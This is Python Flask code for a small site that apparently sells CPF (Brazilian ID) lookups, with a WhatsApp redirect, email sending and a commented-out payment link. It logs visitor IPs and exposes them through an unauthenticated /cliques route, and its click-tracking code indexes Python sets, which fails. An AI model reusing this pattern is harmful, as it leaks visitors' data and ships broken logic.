from flask import Flask, render_template, request, redirect, url_for
import os
import time
import smtp_pague
app = Flask(__name__)



def dhm():
    tempo_local = time.localtime()
    data_hora_minuto = f"{tempo_local.tm_year}-{tempo_local.tm_mon}-{tempo_local.tm_mday} {tempo_local.tm_hour}:{tempo_local.tm_min}"
    return data_hora_minuto

@app.route('/conversao')
def conversao():
    return render_template("c.html")
@app.route('/aqui', methods=['POST'])
def aqui():
    if request.method == 'POST':
        campo = request.form['campo-texto']
        email = request.form['campo-email']
        #sm2 = smtp_pague.send("timpremiados@gmail.com",campo)
        
        sm = smtp_pague.send(email, campo)
        #pix = "https://www.mercadopago.com.br/checkout/v1/payment/redirect/043fb990-1619-4c98-9c47-9d9609ff5959/payment-option-form/?preference-id=422523501-2a076704-eab2-4679-8ac8-797650077d75&router-request-id=f4563d60-f88f-40cd-8a74-730b5e41a969&webview=true&source=link&p=47edabca0cceb46bc47aa8decfeeaf16#/"
        # fazer algo com os dados recebidos
        #CountCliques(1)
        return render_template('pagar.html',campo=campo, email=email)
@app.route('/info')
def info():
    return render_template('infos.html')
        
@app.route('/', methods=['GET', 'POST'])
def form():
    ip_address = request.remote_addr
    print(f"O Ip {ip_address} acessou nosso site")
    CountCliques(0)
    return render_template('busca.html')
    
@app.route('/whatsapp')
def whatsapp():
    return '''<script>window.location.href = "https://wa.me/5521995854873?text=Ol%C3%A1%2C%20Quero%20Consultar%20Um%20CPF%20Grátis";</script>
'''
@app.route('/politica')
def politica():
    return render_template('politica.html')

@app.route('/pagamento')
def pagamento():
    return render_template('source.html')
    
#total, checkout, dúvidas
cliques = {}

def fcToTrue():
    # obter ip
    ip = request.remote_addr
    ip = str(ip)
    # alterar
    cliques[f'{ip}'][2] = 'True'
    

def deuClique():
    # obter ip
    ip = request.remote_addr
    # obter hora
    dhi = dhm()
    # criar registro
    ip = str(ip)
    cliques[f'{ip}'] = {f'{ip}',f'{dhi}','False'}
    
@app.route('/cliques/<int:tipo>')
def CountCliques(tipo):
    if tipo == 0:
        deuClique()
    if tipo == 1:
        fcToTrue()
    if tipo == 3:
        return f"{cliques}"
@app.route('/ze')
def ze():
    return f"Pagina Online"
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
